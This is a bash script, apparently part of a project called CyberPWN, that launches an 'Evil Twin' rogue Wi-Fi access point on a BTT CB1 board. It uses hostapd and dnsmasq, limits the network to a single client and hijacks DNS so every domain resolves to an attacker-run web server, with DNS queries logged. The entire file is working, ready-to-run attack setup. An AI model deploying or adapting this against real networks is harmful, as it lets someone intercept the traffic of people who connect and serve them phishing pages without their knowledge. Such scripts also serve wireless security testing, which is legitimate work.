#!/bin/bash
# Start Evil Twin AP: release wlan0 from NM, set 192.168.4.1, hostapd + dnsmasq.
# Usage: sudo ./PORTABLEAP.sh
# Hosts website at 192.168.4.1:5000 with DNS, single client limit

set -e
SSID="PWN"
AP_PASS="pwn123"
# Project root (parent of scripts/)
BASE="$(cd "$(dirname "$0")/.." && pwd)"
CONFIG="$BASE/evil_twin.conf"
AP_IFACE="wlan0"  # Fixed to wlan0 for AP
SCAN_IFACE="wlan1"  # Use wlan1 for scanning
AP_IP="192.168.4.1"
AP_NET="192.168.4.0/24"
DHCP_START="192.168.4.100"
DHCP_END="192.168.4.100"  # Single client - only one IP
DNSMASQ_CONF="/tmp/cyberpwn_dnsmasq_${AP_IFACE}.conf"
HOSTAPD_PID="/tmp/cyberpwn_hostapd.pid"

# Check if AP interface exists
if ! iwconfig "$AP_IFACE" >/dev/null 2>&1; then
    echo "ERROR: AP interface $AP_IFACE not found"
    exit 1
fi

echo "Using AP interface: $AP_IFACE"
echo "Scan interface available: $SCAN_IFACE"
echo "SSID: $SSID (single client allowed)"
echo "Website will be hosted at: http://$AP_IP:5000"

# 1) Write hostapd config for BTT CB1 (simplified)
cat > "$CONFIG" << EOF
# Evil Twin AP - $SSID (BTT CB1)
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
max_num_sta=1
EOF

cat >> "$CONFIG" << EOF
wpa=2
wpa_passphrase=$AP_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# 2) Release interface from NetworkManager and reset properly (BTT CB1)
echo "Releasing $AP_IFACE from NetworkManager..."
nmcli dev set "$AP_IFACE" managed no 2>/dev/null || true
nmcli device disconnect "$AP_IFACE" 2>/dev/null || true

# Kill any conflicting processes
pkill -f "hostapd.*$AP_IFACE" 2>/dev/null || true
pkill -f "dnsmasq.*$AP_IFACE" 2>/dev/null || true

# Reset interface completely
echo "Resetting $AP_IFACE..."
ip link set "$AP_IFACE" down 2>/dev/null || true
sleep 2
ip addr flush dev "$AP_IFACE" 2>/dev/null || true

# Check if interface supports AP mode
echo "Checking interface capabilities..."
if ! iw phy "$AP_IFACE" info 2>/dev/null | grep -q "AP"; then
    echo "WARNING: Interface may not support AP mode"
fi

# Set interface to managed mode first
iwconfig "$AP_IFACE" mode managed 2>/dev/null || true
sleep 1
ip link set "$AP_IFACE" up 2>/dev/null || true
sleep 2

# Set IP address
ip addr add "$AP_IP/24" dev "$AP_IFACE" 2>/dev/null || true
sleep 1

# Verify interface is ready
if ! ip addr show "$AP_IFACE" | grep -q "$AP_IP"; then
    echo "ERROR: Failed to configure $AP_IFACE with IP $AP_IP"
    echo "Interface status:"
    ip addr show "$AP_IFACE"
    exit 1
fi

echo "Interface $AP_IFACE configured successfully"

# 3) dnsmasq for DHCP (single client) and DNS
cat > "$DNSMASQ_CONF" << EOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=${DHCP_START},${DHCP_END},255.255.255.0,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
# DNS hijacking - redirect all domains to our web server
address=/#/$AP_IP
# DNS server settings
server=8.8.8.8
domain-needed
bogus-priv
# Log DNS queries for monitoring
log-queries
log-dhcp
EOF
pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true
dnsmasq -C "$DNSMASQ_CONF" -q 2>/dev/null &

# 4) hostapd in background for BTT CB1
echo "Starting hostapd..."
pkill -f "hostapd.*$CONFIG" 2>/dev/null || true
sleep 2

# Try to start hostapd directly with debug output
echo "Testing hostapd configuration..."
if timeout 5 hostapd -dd "$CONFIG" 2>&1 | head -20; then
    echo "Configuration test passed"
else
    echo "Configuration test failed, trying simpler config..."
    
    # Try minimal config for BTT CB1
    cat > "$CONFIG" << EOF
# Minimal AP config for BTT CB1
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
max_num_sta=1
EOF
    
    echo "Testing minimal configuration..."
    timeout 5 hostapd -dd "$CONFIG" 2>&1 | head -10
fi

# Start hostapd in background
echo "Starting hostapd in background..."
if hostapd -B -P "$HOSTAPD_PID" "$CONFIG" 2>/dev/null; then
    echo "hostapd started"
else
    echo "ERROR: Failed to start hostapd"
    echo "Trying alternative method..."
    hostapd "$CONFIG" > /tmp/hostapd.log 2>&1 &
    HOSTAPD_PID=$!
    echo $HOSTAPD_PID > "$HOSTAPD_PID"
fi

# Verify hostapd is running
sleep 3
if ! pgrep -f "hostapd.*$CONFIG" >/dev/null; then
    echo "ERROR: hostapd failed to start"
    echo "Debug log:"
    cat /tmp/hostapd.log 2>/dev/null || echo "No log file"
    exit 1
fi

echo "hostapd started successfully"

echo ""
echo "=== AP SETUP COMPLETE ==="
echo "SSID: $SSID (WPA2)"
echo "Password: $AP_PASS"
echo "AP IP: $AP_IP"
echo "Website: http://$AP_IP:5000"
echo "Max clients: 1 (single connection)"
echo "DNS: All domains redirect to $AP_IP"
echo ""
echo "Client will be redirected to your CyberPWN website!"
echo "Use $SCAN_IFACE for network scanning"
